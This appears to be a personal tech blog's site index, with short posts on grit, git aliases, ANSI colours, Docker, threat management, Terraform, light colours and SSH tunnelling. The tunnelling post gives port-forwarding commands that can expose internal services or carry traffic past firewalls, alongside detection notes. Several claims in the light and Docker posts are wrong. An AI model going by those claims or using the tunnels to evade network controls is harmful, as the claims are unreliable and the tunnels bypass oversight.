06:06","externalUrl":null,"permalink":"/tags/fortitude/","section":"tags","summary":"","title":"fortitude","type":"tags"},{"content":"","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tags/grit/","section":"tags","summary":"","title":"grit","type":"tags"},{"content":"","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tags/perseverance/","section":"tags","summary":"","title":"perseverance","type":"tags"},{"content":"","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tags/resoluteness/","section":"tags","summary":"","title":"resoluteness","type":"tags"},{"content":"","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tags/tenacity/","section":"tags","summary":"","title":"tenacity","type":"tags"},{"content":" The Power of Grit: Passion and Perseverance for Success in Education Leaving a high-flying job in consulting, Angela Lee Duckworth took a job teaching math to seventh graders in a New York public school. She quickly realized that IQ wasn\u0026rsquo;t the only thing separating the successful students from those who struggled. Here, she explains her theory of \u0026ldquo;grit\u0026rdquo; as a predictor of success.\nHere\u0026rsquo;s the link to excellent TED Talk session by Angela: The Power of Grit.\nIn a world that often prioritizes IQ and talent, Angela Duckworth, a former teacher turned psychologist, discovered that something else plays a crucial role in determining success: grit (堅毅). Here, we\u0026rsquo;ll explore the transcript of Angela Duckworth\u0026rsquo;s TED Talk, where she discusses her journey from teaching to researching the importance of grit in various contexts, particularly in education.\nWhat is Grit? # Grit, as defined by Duckworth, is the combination of passion and perseverance for long-term goals. It\u0026rsquo;s about having the stamina to stay committed to your goals, working hard day in and day out, not just for a short period, but for years. Grit means living life like a marathon, not a sprint. It\u0026rsquo;s a quality that goes beyond traditional measures like IQ, social intelligence, or physical appearance.\nThe Discovery of Grit # Duckworth\u0026rsquo;s journey began when she transitioned from a demanding management consulting job to teaching seventh graders math in New York City. She observed that IQ wasn\u0026rsquo;t the sole differentiator between her best and worst students. Some of the brightest kids struggled, while some with average IQs excelled. This realization prompted her to investigate further.\nYears of research in challenging settings, including West Point Military Academy, the National Spelling Bee, and underprivileged schools, consistently revealed that grit was a significant predictor of success. Grittier individuals were more likely to persevere and achieve their goals, even when other factors were controlled for.\nBuilding Grit in Kids # Despite the importance of grit, the question remains: How can we build it in kids? Duckworth acknowledges that there\u0026rsquo;s no easy answer. However, she highlights the concept of \u0026ldquo;growth mindset\u0026rdquo; as a promising approach. Developed by Carol Dweck at Stanford University, it teaches kids that their ability to learn isn\u0026rsquo;t fixed and can improve with effort. When children believe that failure isn\u0026rsquo;t permanent, they are more likely to persevere.\nBut Duckworth emphasizes the need for more research and ideas to effectively nurture grit in children. We must be willing to test our best ideas, measure their success, and be prepared to adapt and learn from our failures.\nConclusion: Let\u0026rsquo;s Get Gritty # In the world of education, it\u0026rsquo;s clear that IQ and talent alone aren\u0026rsquo;t sufficient for success. Grit, that combination of passion and perseverance for long-term goals, plays a crucial role. To empower our children with grit, we must continue our efforts to explore and develop effective strategies. It\u0026rsquo;s time to be gritty about making our kids grittier.\nIn summary, grit is the secret ingredient that sets apart successful individuals, and though the path to building it may not be entirely clear, it\u0026rsquo;s a journey worth embarking upon for the betterment of our children\u0026rsquo;s future.\n","date":"2023-10-22 06:06","externalUrl":null,"permalink":"/tedtalk/power_of_grit/","section":"TED Talks","summary":"Passion and Perseverance for Success in Education.","title":"The Power of Grit","type":"tedtalk"},{"content":"","date":"2023-10-18 12:12","externalUrl":null,"permalink":"/categories/dotfiles/","section":"categories","summary":"","title":"dotFiles","type":"categories"},{"content":"","date":"2023-10-18 12:12","externalUrl":null,"permalink":"/tags/git/","section":"tags","summary":"","title":"git","type":"tags"},{"content":" Create shortcuts for your most-used Git commands. Here is a short post that help making you more efficient with Git alias.\nGit Alias # There are 2 ways to add alias:\nEdit the ~/.gitconfig file. Use the command line method. Here is a demo on using the command line method to add an alias:\n$ git config --global alias.st \u0026#39;status -sb\u0026#39; And here is a demo on using the alias:\n$ git st ## main...origin/main One it is added (with command line), you can always check all the stored aliases at the file ~/.gitconfig.\nBelow here is the full output with my git alias, git la or the full command git config -l | grep alias | cut -c 7-:\n$ git la ll=log --color --graph --pretty=format:\u0026#34;%C(yellow)%h %C(green)%ad %C(blue)|%Cred%d %Creset%s%C(cyan) [%cn]\u0026#34; --abbrev-commit --decorate --date=short co=checkout st=status -sb last=log -1 HEAD --stat dv=difftool -t vimdiff -y tree=diff-tree --no-commit-id --name-only -r la=!git config -l | grep alias | cut -c 7- gl=config --global -l Links # Basic Git Aliases Git Wiki Aliases page ","date":"2023-10-18 12:12","externalUrl":null,"permalink":"/posts/git_alias/","section":"posts","summary":"With aliases, you can start avoid typing the same commands over and over again.","title":"Simple Git Aliases","type":"posts"},{"content":" ANSI Escape Code # ANSI Escape Code is a technique used to control cussor location, color, font styling on a text terminals, aka \u0026ldquo;command line\u0026rdquo; or \u0026ldquo;cmdline\u0026rdquo; or \u0026ldquo;cli\u0026rdquo;.\nIn HTML world, all these can be done easily. In other environment, it may not be as simple as in HTML world.\nBelow are the examples, from Wikipedia, how it can be used to change the display on the terminal emulator.\nANSI Color Code # Foreground Background Color Name VGA 30 40 Black 0,0,0 31 41 Red 170,0,0 32 42 Green 0,170,0 33 43 Yellow 170,85,0 34 44 Blue 0,0,170 35 45 Magenta 170,0,170 36 46 Cyan 0,170,170 37 47 White 170,170,170 90 100 Bright Black 85,85,85 91 101 Bright Red 255,85,85 92 102 Bright Green 85,255,85 93 103 Bright Yellow 255,255,85 94 104 Bright Blue 85,85,255 95 105 Bright Magenta 255,85,255 96 106 Bright Cyan 85,255,255 97 107 Bright White 255,255,255 Bash (color codes) # Use the following template to print color text.\necho -e \u0026#34;\\e[COLORmSample Text\\e[0m\u0026#34; echo -e \u0026#34;\\e[COLOR1;COLOR2mSample Text\\e[0m\u0026#34; echo -e \u0026#34;\\e[MODE;COLOR1;COLOR2mSample Text\\e[0m\u0026#34; Options Description echo -e Interpre blackslash escape \\e[ Begin escape color change MODE Color mode COLOR1m Color code + \u0026rsquo;m' COLOR2m Color code + \u0026rsquo;m' \\e[0m Reset Mode Description 0 Normal character 1 Bold character 4 Underlined character 5 Blink character 7 Reverse video character Example # Simple test.\n$ echo -e \u0026#34;\\e[37m White_Text \\e[0m\u0026#34; White_Text $ echo -e \u0026#34;\\e[1;34m Light_Blue_Text \\e[0m\u0026#34; Light_Blue_Text $ echo -e \u0026#34;\\e[1;33;4;44m Underlined Yellow on Blue \\e[0m\u0026#34; Underlined Tellow on Blue Test all colors with a for-loop.\nfor code in {0..255} do echo -e \u0026#34;\\e[38;5;${code}m\u0026#34;\u0026#39;\\\\e[38;5;\u0026#39;\u0026#34;$code\u0026#34;m\u0026#34;\\e[0m\u0026#34; done Bash (flasher) # The following Bash function flashes the terminal until the user presses a key.\nflasher () { while true; do printf \\\\e[?5h; sleep 0.1; printf \\\\e[?5l; read -s -n1 -t1 \u0026amp;\u0026amp; break; done; }\nOr, you can add it to shell script file.\n#!/bin/bash flasher () { while true do printf \\\\e[?5h sleep 0.1 printf \\\\e[?5l read -s -n1 -t1 \u0026amp;\u0026amp; break done } PowerShell # Testing color with ANSI Escape code in PowerShell.\nPS\u0026gt; $esc = [char]27 PS\u0026gt; write-host \u0026#34;$esc[32m Green $esc[0m\u0026#34; Green PS\u0026gt; Links # Wikipedia ANSI escape code VT100 User Guide Tool: ANSI ","date":"2023-10-09 02:00","externalUrl":null,"permalink":"/posts/ansi_escape_code_colors/","section":"posts","summary":"Notes about ANSI escape code for colors.","title":"Colors with ANSI Escape Code","type":"posts"},{"content":"","date":"2023-10-09 02:00","externalUrl":null,"permalink":"/tags/console/","section":"tags","summary":"","title":"console","type":"tags"},{"content":"Let\u0026rsquo;s see what does Docker mean for us today?\nToday\u0026rsquo;s Docker # Docker used to be proprietary technology. But it has increasingly embrace open standard, called OCI. This openness has paved tha way for more tools created in Docker space, as long as the tools are adhere to the OCI standard.\nWith OCI standardization, the original Docker engine is now replaceable.\nLet\u0026rsquo;s quickly learn the basic architecture of Docker.\nArchitecture # Docker has 3 primary components.\nDocker client Docker daemon Docker registry Docker client is the primary interface for interacting with Docker. It communicates with the Docker daemon to manage Docker objects (within), including images and runtime containers.\nThe second component is Docker daemon. It resides in a system called Docker host, that running the Docker software. It is the core engine that manages the container operations (build, run, stop) and images stored at registries. Note that, the Docker daemon can utilize the OCI compliant run-times, like cri-o and LXC, for running containers.\nThe third compoenent is Docker registry. The most commonly used is Docker registry called Docker Hub. Docker Hub stores and distributes container images.\ngraph TD; D1{{Docker CLI}} D2{{Docker Daemon}} D3{{Docker Registry}} D21([Containers]) D22([Images]) D31([docker hub]) subgraph Arch[ ] subgraph aa[Docker Architecture] end D1 --\u003e|REST API| g2; D2 --\u003e|manage| D22; D2 --\u003e|build, run, manage| D21; D22 --\u003e|push/upload| D31; D31 --\u003e|pull/download| D22; subgraph g1[Docker Client] D1 end subgraph g2[Docker Host] D2 D21 D22 end subgraph g3[Docker Registry] D3 D31 end end linkStyle default stroke: #8080FF classDef title font-size:28px,color:#000000,fill:#FFBF00 classDef subtitle font-size:14px,color:#8080FF,fill:#FFBF00 class g1,g2,g3 subtitle class Arch title class aa title Open Container Initiative (OCI) # OCI standardize container runtime, image, distribution. It is an open standard to ensure the container ecosystem remains open and not tied to a single vendor.\ngraph TD; P0[ OCI Standard ] C1{{runtime-spec}} C2{{image-spec}} C3{{distribution-spec}} P0 --\u003e C1; P0 --\u003e C2; P0 --\u003e C3; subgraph main[OCI] P0 C1 C2 C3 end linkStyle default stroke: #8080FF classDef main font-size:28px,color:#FFBF00,fill:#FFBF00 class main main Docker Vs OCI # Docker has popularized several key concept in containerization:\nStandardize image format. Streamline the building of container images. Enabling the sharing of images through Registries. Facilitate the actual running of containers. With OCI standardizing container technologies, new tools are built to deliver speed and efficiency.\nAlternatives to Docker Components # Here are some alternatives to standard Docker components.\nDocker Alternatives Docker Client docker cli\nPodman Docker Daemon docker runtime\nLXC\ncontainerD\nBuildKit\nZeroVM Docker Registry docker hub\nAmazon Elastic Container\nAzure Container Registry\nGoogle Container Registry\nSandboxie\nRed Hat Quay\nHarbor\nZooKeeper ","date":"2023-10-08 22:00","externalUrl":null,"permalink":"/posts/docker_101/","section":"posts","summary":"Let\u0026rsquo;s learn about Docker architecture and its alternatives.","title":"Docker 101","type":"posts"},{"content":"","date":"2023-10-02 15:40","externalUrl":null,"permalink":"/tags/hugo/","section":"tags","summary":"","title":"hugo","type":"tags"},{"content":" See, 🐡 is here !! New Theme # Today, this website is switching the theme, from Terminal to Blowfish.\nLinks # Terminal at Github. Blowfish at GitHub. ","date":"2023-10-02 15:40","externalUrl":null,"permalink":"/posts/hugo_blowfish/","section":"posts","summary":"Change to a new theme (Blowfish).","title":"Hugo + Blowfish","type":"posts"},{"content":" Street Light # All the while, I\u0026rsquo;ve been wondering why orange or amber color is always the choice for street lamps. Is it because of human like orange or amber more?\nActually, the choice of using orange or amber light for street lamps is based on several factors, including visibility, energy efficiency, and minimizing light pollution. Here\u0026rsquo;s why orange or amber light is often preferred over red light for street lighting:\nVisibility and Contrast: Orange/amber light provides good visibility and contrast for drivers and pedestrians, especially in various weather conditions such as fog, rain, or snow. Red light, on the other hand, may not offer the same level of contrast and visibility, making it less suitable for illuminating streets.\nHuman Perception: Human eyes are more sensitive to orange and amber wavelengths, allowing better perception of details and objects under this lighting compared to red light. Red light is less effective in providing sufficient illumination for activities that require good visibility.\nLight Penetration and Distance: Both red and orange light can travel relatively far, but their ability to penetrate through obstacles, like fog or rain, may differ. The choice of color for street lighting is based on various factors, including how the light interacts with the environment, rather than simply how far it can travel.\nLight Pollution: Reducing light pollution is an important consideration in outdoor lighting. Using a specific color of light, such as orange or amber, helps minimize light pollution by reducing the amount of light that scatters into the sky and nearby areas.\nThe orange or amber color of street lamps is typically due to the type of light bulb used, particularly high-pressure sodium (HPS) or low-pressure sodium (LPS) lamps. These lamps emit light in the yellow-orange part of the spectrum.\nIn summary, while red light can travel a certain distance, it may not provide optimal visibility, contrast, and efficiency for street lighting purposes. Orange or amber light strikes a balance between visibility, efficiency, human perception, and minimizing light pollution, making it a preferred choice for street lighting.\nLight Penetration \u0026amp; Night Vision # In terms of light penetration through various substances, blue and violet light have shorter wavelengths and higher energy, allowing them to penetrate through certain materials more effectively compared to longer-wavelength colors like red or orange.\nHere\u0026rsquo;s a general overview of light penetration for different colors:\nBlue and Violet Light: Blue and violet light have shorter wavelengths and higher energy, enabling them to penetrate through substances like water and some other materials more effectively. This is why underwater environments often appear blue or greenish-blue due to the scattering and absorption of longer-wavelength light.\nGreen Light: Green light has a moderate wavelength and can penetrate water to some extent, but not as effectively as blue and violet light.\nYellow and Orange Light: Yellow and orange light have longer wavelengths compared to blue and green light. They penetrate substances like water less effectively and are often absorbed or scattered more readily, reducing their ability to travel through materials.\nRed Light: Red light has the longest wavelength among visible colors. It is absorbed and scattered more easily in water and other substances, resulting in less penetration compared to shorter-wavelength colors like blue and violet.\nIt\u0026rsquo;s important to note that the ability of light to penetrate substances also depends on factors such as the specific material, its density, purity, and any impurities present. Additionally, the scattering and absorption properties of different materials play a significant role in determining how light penetrates and interacts with them.\nFor medical imaging or other applications requiring deeper tissue penetration, specific wavelengths of light, often in the near-infrared range, are used because they can penetrate skin and other biological tissues more effectively.\nUsage of Red Light # Red light is often used to signal alerts or indicate warnings to humans for several reasons, despite its relatively lower penetration compared to shorter-wavelength lights:\nAttention and Visibility: Red light is easily perceived by the human eye and stands out well against many backgrounds. It is a color that naturally draws attention, making it effective for alerting and signaling.\nCultural Associations: Red has cultural associations with warning, caution, and danger. Over time, societies have adopted red as a color for signaling alarms, stop signs, traffic lights, and other warning indicators.\nNight Vision Preservation: Red light is less likely to disturb night vision compared to brighter, higher-energy colors. When used in low-light or dark environments, like in the cockpit of an aircraft or on a ship, red light allows individuals to maintain better night vision while still providing enough illumination for reading or navigating.\nReduced Disruption to Sleep: Exposure to blue or white light can interfere with circadian rhythms and disrupt sleep patterns. Red light, being at the longer-wavelength end of the visible spectrum, has less impact on melatonin production and is often used in low-light settings to minimize disturbances to sleep.\nSafety in Certain Environments: In environments where the use of white or bright lights might be dangerous (e.g., astronomy observatories, submarines, military operations), red light is employed to maintain low light levels for safety without compromising visual awareness.\nIn summary, while red light may not penetrate as deeply into materials as shorter-wavelength light, its visibility, attention-grabbing nature, cultural associations, and suitability for low-light environments make it a practical choice for signaling alerts and warnings to humans.\nPenetration Rate vs Visibility Rate # Penetration rate and visibility rate are related but not the same thing. Let\u0026rsquo;s clarify the difference:\nPenetration Rate: Penetration rate refers to how deeply a light wave can travel through a material before being absorbed, scattered, or attenuated. Shorter-wavelength light, like blue and violet light, typically penetrates materials more effectively than longer-wavelength light, like red light.\nVisibility Rate: Visibility rate refers to how easily a light can be seen and distinguished by the human eye. It\u0026rsquo;s about how well a light is perceived in terms of brightness and contrast against its background, regardless of its ability to penetrate through materials.\nIn general, shorter-wavelength light penetrates better through materials, but this doesn\u0026rsquo;t necessarily mean it\u0026rsquo;s more visible to the human eye. Visibility is influenced by factors like the sensitivity of human vision to different wavelengths (spectral sensitivity), the contrast against the background, and other optical properties of the environment.\nFor example, red light may not penetrate as far through fog or water compared to blue light, but it can still be more visible to the human eye in those conditions due to its higher contrast and better perception by our eyes.\nIn applications like signaling and lighting, both penetration and visibility are important considerations. The choice of light color is often a balance between these factors, depending on the specific use case and the desired outcome.\nLight of Choices # During the day with heavy rain or fog, and at night, the choice of lighting for a car is crucial to ensure visibility and safety. Here are recommendations for both scenarios:\nDaytime with Heavy Rain or Fog:\nRecommended: White or Amber Light Reasoning: White light provides good visibility and contrast during the day, making it easier for other drivers to see your vehicle through heavy rain or fog. Amber light (yellow-orange) is also effective as it cuts through fog and rain better than other colors and helps in improving visibility. Nighttime:\nRecommended: White and Red Light Reasoning: White light, including headlights and front-facing lights, is essential for illuminating the road ahead and providing adequate visibility during the night. Red light is used for rear-facing lights, like tail lights and brake lights. It\u0026rsquo;s easily distinguishable and indicates the position and actions of the vehicle to other drivers. Light Groups Comparison # Below is a comparison of different color groups, including invisible color groups, based on energy, visibility, penetration rate, and wavelength.\nPlease note that the provided information is a general comparison and may vary slightly based on specific circumstances and contexts.\nColor Group Energy Visibility Penetration Rate Wavelength Range (nm) Gamma Rays Exceptionally High Invisible Very High (through most materials) \u0026lt; 0.01 nanometers X-rays Extremely High Invisible Very High (through many materials) \u0026lt; 10 nanometers Ultraviolet (UV) Very High Invisible High (through certain materials) \u0026lt; 380 Blue/Violet High Good High (through certain substances) ~380-495 Green Moderate Good Moderate (through some substances) ~495-570 Yellow/Amber Moderate Good Moderate (through certain substances) ~570-590 Red Low Good Low (absorbed/scattered easily) ~620-750 Infrared Lower Invisible Low (through many materials) \u0026gt; 750 Microwaves Even Lower Invisible Low (through most materials) \u0026gt; 1 millimeter Radio Waves Lowest Invisible Lowest (through most materials) \u0026gt; 1 millimeter and more Notes:\nEnergy: Indicates the energy level associated with each color, with blue/violet having the highest energy and red having the lowest. Visibility: Refers to how easily the color is perceived by the human eye, with all colors being generally good for visibility. Penetration Rate: Describes the ability of the color to penetrate through substances, with shorter-wavelength colors (blue/violet) penetrating more effectively than longer-wavelength colors (red). Wavelength (nm): Represents the approximate range of wavelengths for each color group. Black and White Lights # Black is not considered a color in the traditional sense when it comes to light. Instead, black is the absence or complete absorption of visible light. When you perceive an object as black, it means that the surface of the object absorbs most of the visible light that falls on it, rather than reflecting or transmitting it.\nTherefore, black doesn\u0026rsquo;t have a specific wavelength associated with it because it\u0026rsquo;s defined by the absence of light.\nWhite light is not associated with a specific wavelength; instead, it is a combination of all visible wavelengths of light. When you see white light, you\u0026rsquo;re perceiving a mix of various colors across the visible spectrum. The exact composition and proportion of these colors determine the quality and appearance of the white light.\nIn physics, white light is often described as a combination of all colors in the visible spectrum. When white light is passed through a prism, it is dispersed into its constituent colors, resulting in a rainbow-like spectrum known as a continuous spectrum. This dispersion of colors is due to the differing wavelengths of each color in the white light.\nIn summary, white light is not associated with a single wavelength; rather, it encompasses all visible wavelengths, blending them together to create what we perceive as white.\nEaster Eggs: Theme Color Used # Amber/#FFBF00 Chartreuse/#7FFF00 Blue Bluish/#8080FF amber2/#ffc107 lime/#DFFF00 periwinkle/#8080FF amber2/#ffc107 lime2/#a1e335 periwinkle/#8080FF Charcoal/#303030 Grey/#BDBDBD Black/#000000 {{\u0026lt; swatches \u0026#34;#FFBF00\u0026#34; \u0026#34;#7FFF00\u0026#34; \u0026#34;#8080FF\u0026#34; \u0026gt;}} {{\u0026lt; swatches \u0026#34;#303030\u0026#34; \u0026#34;#BDBDBD\u0026#34; \u0026#34;#808080\u0026#34; \u0026gt;}} Simplicity is the Ultimate Sophistication ","date":"2023-09-22 11:47","externalUrl":null,"permalink":"/colors/","section":"MySeq","summary":"Light of colors.","title":"Colors","type":"page"},{"content":"","date":"2023-09-22 11:47","externalUrl":null,"permalink":"/categories/others/","section":"categories","summary":"","title":"Others","type":"categories"},{"content":"","date":"2023-09-22 11:47","externalUrl":null,"permalink":"/categories/","section":"categories","summary":"","title":"🥚","type":"categories"},{"content":"","date":"2023-09-15 07:22","externalUrl":null,"permalink":"/categories/simplify/","section":"categories","summary":"","title":"Simplify","type":"categories"},{"content":" What is Threat Management? # Risk management is a process to build a strategy to measure cybersecurity risk.\nThreat Management is a process to build the strategy (using framework) to prevent cyberattacks. Just like risk management, it is also an essential part of Cybersecurity strategy.\nThe most common framework used nowadays is using NIST Cybersecurity Framework. It contains the 5 primary functions:\nIdentify Protect Detect Respond * Recover Threat Management can be very useful to help CISO to plan and prioritize (budgetting) what tools should be deployed whenever a new infrastructure is needed. For example, if a company wish to transform to start using container and cloud for hosting the application. Then we can start creating threat management for container and cloud.\nThreat Management can be a powerful tool for Cybersecurity team. It helps cyber team to build threat management for different infra, such as on-prem infra, cloud infra, or even webapp system. And it can always be re-used for any at newly proposed/plan web application that hosting at ISP.\nExample 1: Threat Management for Container Security # Here, I\u0026rsquo;ll demo how threat management (simplified version) can be built for container security.\nThreat/Attacks Detection/Discover Mitigation (rebuild image) Badly built container images - Static analysis tools (CI/CD)\n- vuln scanner (remote) Patch base image Vulnerable Apps - SAST (local)\n- DAST/WebApp scan (remote) Update codes Supply chain - SBOM\n- vuln scanner * Patch base image Badly configured container - Static analysis tools (CI/CD) Re-configure container Vulnerable hosts - vuln scanner (remote) Patch the hosts Exposed secrets - Static analysis tools (CI/CD) Re-configure container Container escape Security Hardening In real life, it can go deeper by exploring into different tools for identify/protect/detect/respond/recover. It also can go multi-layer of discover and protection to ensure defense-in-depth strategy is being applied too.\nLinks # NIST Cybersecurity Framework (CSF) ","date":"2023-09-15 07:22","externalUrl":null,"permalink":"/posts/threat_management_101/","section":"posts","summary":"Explain Threat Management in 2 min.","title":"SimplifyCybersecurity: Threat Management","type":"posts"},{"content":"","date":"2023-09-15 07:22","externalUrl":null,"permalink":"/tags/strategy/","section":"tags","summary":"","title":"strategy","type":"tags"},{"content":" SANS Cloud Security: The Rise of Terraform in Cloud Security # My Notes # Here\u0026rsquo;re the notes taken with OpenAI\u0026rsquo;s ChatGPT and YouTube Summary with ChatGPT \u0026amp; Claude:\nThe talk focuses on the rise of Terraform in Cloud security. Terraform is an infrastructure as code tool used to manage resources in the Cloud. Terraform helps in defining, deploying, and managing resources like S3 buckets, load balancers, EC2 instances, etc. It allows configurations to be committed to Version Control for collaboration. Logging and monitoring are essential for Cloud security. Terraform enables proper authentication and authorization for different environments, including Dev, non-prod, and production. Developers should not have direct access to production environments. Collaboration between development and operations (DevOps) is crucial for Cloud security. Cloud security should be embedded into the development process. Building Cloud resources correctly from the start enhances security. Terraform and Terraform Cloud provide infrastructure as code solutions. The speaker emphasizes building trust with developers. \u0026ldquo;Champions\u0026rdquo; from outside of the security team can help drive security initiatives. Communication and alignment on minimum viable products (MVPs) are essential. Scalability and cost reduction are benefits of using Terraform for infrastructure. Regular maintenance and oversight are required to ensure security. Sentinel policies and other standards can prevent unauthorized deployments. Usability and enabling developers are key to effective Cloud security. Terraform security checks should be aligned with the CI/CD pipeline. Finding a passion and continuous learning are recommended for career growth. Practical resources for Terraform can be explored to select useful ones for an organization. ","date":"2023-09-07 02:35","externalUrl":null,"permalink":"/posts/the_rise_terraform_cloud_security/","section":"posts","summary":"The Rise of Terraform in Cloud Security - By Ryan Weber","title":"The Rise of Terraform in Cloud Security","type":"posts"},{"content":"","date":"2023-09-07 02:35","externalUrl":null,"permalink":"/tags/webcast/","section":"tags","summary":"","title":"webcast","type":"tags"},{"content":"","date":"2023-09-05 21:18","externalUrl":null,"permalink":"/tags/ssh/","section":"tags","summary":"","title":"ssh","type":"tags"},{"content":" SSH Tunnelling # SSH Tunnelling is often used to create an encrypted connection between local machine and a remote server which relay traffic. Through the secure tunnel, it can protect unencrypted traffic, such as VNC or database connection, from being eavesdropping.\nDepends on the situation, there are 3 ways to create tunnelling with SSH port forwarding.\nLocal port forwarding Remote port forwarding Dynamic port forwarding Choosing which tunnelling depends on the firewall configuration. Refer to the prerequisite sections below.\nSSH Local Port Forwarding # SSH local port forwarding allows you to securely access a service running on a remote server through an encrypted SSH tunnel.\nPrerequisite Local port forwarding can only be used provided you can successfully establish a SSH connection (22/tcp) to the SSH server through the firewall. This means the firewall has to grant access to to SSH server on port 22/tcp.\ngraph fw1{{fw_allow}} fw2{{fw_block}} subgraph main[Prerequisite: Firewall Requirement] direction RL subgraph grant[Success: Allow incoming SSH port] direction LR client1 --\u003e |22/tcp| fw1 --\u003e |dport:22| sshd1 end subgraph fail[FAIL: incoming SSH port is blocked] direction LR client2 --\u003e |22/tcp| fw2 --\u003e sshd2 end end linkStyle default stroke-width:4px linkStyle 0 stroke:yellow linkStyle 1 stroke-width:3px,stroke:green linkStyle 2 stroke:yellow linkStyle 3 stroke:red classDef Allow color:#0ff classDef Block color:#f00 class grant Allow class fail Block Here\u0026rsquo;s the cmdline to create a SSH local port forwarding: ssh -L [bind_addr]:\u0026lt;port\u0026gt;:\u0026lt;host\u0026gt;:\u0026lt;host_port\u0026gt; \u0026lt;ssh_server\u0026gt;\nBelow is the diagram to show how local port forwarding connection works:\nEstablished the secure tunnel [blue] Connect from client(*) to web1:8080 (or web2:9090) in clear text traffic [yellow] graph BT ssh_1([\"web1:8080 ssh_svr:22\"]) fw_1{{firewall}} cli_1((client:8080)) cli_2((client:9090)) fw_2{{firewall}} ssh_2[\"ssh_svr:22\"] web2([\"web2:9090\"]) subgraph main[Local Port Forwarding] direction BT subgraph DC[Datacenter] direction BT fw_1 ==\u003e |dport:22| ssh_1 ssh_1 -.-\u003e |dport:8080| ssh_1 fw_2 ==\u003e |dport:22| ssh_2 ssh_2 -.-\u003e |dport:9090| web2 end subgraph Home[Remote] direction BT cli_1 === |22/tcp| fw_1 cli_1 -.-\u003e |dport:8080| cli_1 cli_2 === |22/tcp| fw_2 * -.-\u003e |dport:9090| cli_2 end end linkStyle default stroke-width:4px,stroke:red linkStyle 0 stroke-width:4px,stroke:blue linkStyle 1 stroke-width:5px,stroke:yellow linkStyle 2 stroke-width:4px,stroke:blue linkStyle 3 stroke-width:4px,stroke:yellow linkStyle 4 stroke-width:4px,stroke:blue linkStyle 5 stroke-width:4px,stroke:yellow linkStyle 6 stroke-width:4px,stroke:blue linkStyle 7 stroke-width:4px,stroke:yellow classDef main font-size:20px,color:#f66 classDef Group1 color:#0ff classDef Group2 color:#0f0 class main main class DC Group1 class Home Group2 The flow diagram on the left, is a typical way how remote worker can establish remote access with local port forwarding. However, it can be extended to the flow diagram at the right, to allow other to access web server (web2 at port 9090/tcp).\nScenario 1 (left) # Run the below cmdline at client, and point the (client) browser to http://localhost:8080, should be connecting to http://web1:8080\nssh -L 8080:web1:8080 user@ssh_svr\nScenario 2 (right) # Run the below cmdline at client, and allow other\u0026rsquo;s to browse at http://client:9090, should be connecting to http://web2:9090\nssh -L 0.0.0.0:9090:web2:9090 user@ssh_svr\nSSH Remote Port Forwarding # SSH remote port forwarding allows remote server to access a service running on local machine/network through an encrypted SSH tunnel.\nPrerequisite Remote port forwarding is only useful when you have a SSH server that locates at the Internet and is accessible by both client and remote worksapce.\nHere’s the cmdline to create a SSH remote port forwarding: ssh -R [bind_addr]:\u0026lt;port\u0026gt;:\u0026lt;host\u0026gt;:\u0026lt;host_port\u0026gt; \u0026lt;ssh_server\u0026gt;\nBelow is the diagram to show how remote port forwarding connection works:\nEstablished the secure tunnel [blue] Connect from remote to web:8080 in clear text traffic [yellow] graph direction LR sshd([\"sshd:22 fport:80\"]) client([\"client\"]) demo[\"web:8080\"] remote((remote)) subgraph main[Remote Port Forwarding: remote -\u003e web:8080] subgraph intra[Intranet] client --\u003e |8080/tcp| demo end subgraph cloud[Internet] sshd remote --\u003e |80/tcp| sshd end client --\u003e |22/tcp| sshd end linkStyle default stroke-width:4px linkStyle 0 stroke:yellow linkStyle 1 stroke:yellow linkStyle 2 stroke:blue classDef Block color:#0ff classDef Title color:#f66 class main Title class cloud,intra Block Scenario # Run the cmdline below at the client to establish the tunnel. Then the remote workspace can browse to http://fport:80 and the traffic will be redirected to http://web:8080.\nssh -R 0.0.0.0:80:web:8080 user@sshd In this case, the fport can be the same IP address as sshd.\nSSH Dynamic Port Forwarding # SSH dynamic port forwarding provides greater flexibility for client to connect into Intranet (or datacenter) via SOCKS proxy server.\nPrerequisite Dynamic port forwarding turns on the SOCKS proxy at SSH server. It allows the client browser to connect to any server behind SSHD server with the SOCKs proxy config. And all these must require access to SSHD server at port 22/tcp, (similar to local port forwarding setup).\nSOCK DNS setup: At Firefox browser, setup about:config \u0026gt; network.proxy.socks_remote_dns;true\nHere\u0026rsquo;s the cmdline to create a SSH dynamic port forwarding: ssh -D [bind_addr]:\u0026lt;port\u0026gt; \u0026lt;ssh_server\u0026gt;\nBelow is the diagram to show how dynamic port forwarding connection works:\nEstablished the secure tunnel [blue] Setup SOCK proxy at browser by pointing to client and SOCK port. Ensure SOCK DNS is configured (see above). graph client([\"client:1080\"]) local([\"client:1080\"]) sshd([\"sshd:22\"]) http([\"web:80\"]) https([\"web:443\"]) fw{{firewall}} subgraph main[Dynamic Port Forwarding: client -\u003e http or https] direction BT subgraph DC[Intranet] direction BT fw --\u003e |dport:22| sshd sshd --\u003e |80/tcp| http sshd --\u003e |443/tcp| https end subgraph cloud[Remote] direction BT client === |22/tcp| fw * --\u003e |1080/tcp| client local === |22/tcp| fw local -.-\u003e |1080/tcp| local end end linkStyle default stroke-width:4px linkStyle 0 stroke:blue linkStyle 1 stroke:yellow linkStyle 2 stroke:cyan linkStyle 3,5 stroke:blue linkStyle 4,6 stroke:cyan classDef Title color:#f66 classDef subTitle color:#0ff class main Title class cloud,DC subTitle Scenario # Run the cmdline below at the client to establish the tunnel. Then configure the browser SOCK proxy and pointing to socks://client:1080 with remote SOCK DNS setup (for SSHD server to resolve the destination dynamically), then the browser will able to browse to any HTTP/HTTPS server behind the SSHD server.\nssh -D 1080 user@sshd\nAdditional Tips # To disable remote shell when creating tunnel (port forwarding), use -N.\nTo make SSH session into background, add the -f.\nAdditional 2 options can be applied while creating tunnel (port forwarding) as below:\nssh -f -n -N ... user@ssh_server -f To run/put SSH request at background. -N To disable remote shell cmd execution. -n Redirects stdin from /dev/null (no input from stdin). Must used together with -f (backfround). Tunnelling Detection # Due to the nature of how SSH protocol works, it is possible for firewall, such as Palo Alto firewall (PAN-OS), to allow SSH traffic but blocking the SSH tunnelling.\nThe firewall checks the traffic between the client and server to see if it is routed normally or if it uses SSH port forwarding (SSH tunneling). If the firewall identifies SSH port forwarding, the firewall blocks the tunneled traffic and restricts it according to the configured Security policy. The firewall only looks for SSH port forwarding, it does not perform content and threat inspection on SSH tunnels.\nPAN-OS Adminitrator Guide: SSH Proxy Metallic Code: Detecting SSH Tunnels Trisul: Traffic analysis of 